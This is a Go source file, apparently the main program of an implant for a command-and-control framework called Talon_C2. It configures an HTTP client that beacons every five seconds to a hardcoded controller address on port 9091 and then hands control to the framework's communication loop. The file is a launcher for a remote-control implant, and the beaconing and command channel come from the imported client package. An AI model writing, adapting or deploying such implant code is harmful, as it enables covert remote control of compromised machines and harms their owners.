package main

import (
	"fmt"
	"time"

	//"github.com/gofrs/uuid"

   "github.com/Cleck777/Talon_C2/Talon_Implant/clients"

	

)

func main() {
	// Generate a unique ID for the Talon implant
	/*id, err := uuid.NewV4()
	if err != nil {
		// Handle error
		fmt.Println("Error generating UUID:", err)
		return
	}
	talonID := id.String()*/

	// Configure the client
	config := clients.ClientConfig{
		Mode:           "session",
		URL:            "https://192.168.112.145:9091",
		BeaconInterval: time.Second * 5,
		BeaconData:     []byte{}, // Provide any data you want to send with the beacon
	}

	// Initialize the HTTPClient with the provided configuration
	fmt.Println("Initializing HTTP client...")
	time.Sleep(time.Second * 2)
	httpClient := clients.NewHTTPClient(config)
	fmt.Println("HTTP client initialized.")
	fmt.Println(httpClient)
	time.Sleep(time.Second * 2)
	// Start communication based on the configuration mode
	httpClient.StartCommunication()
}
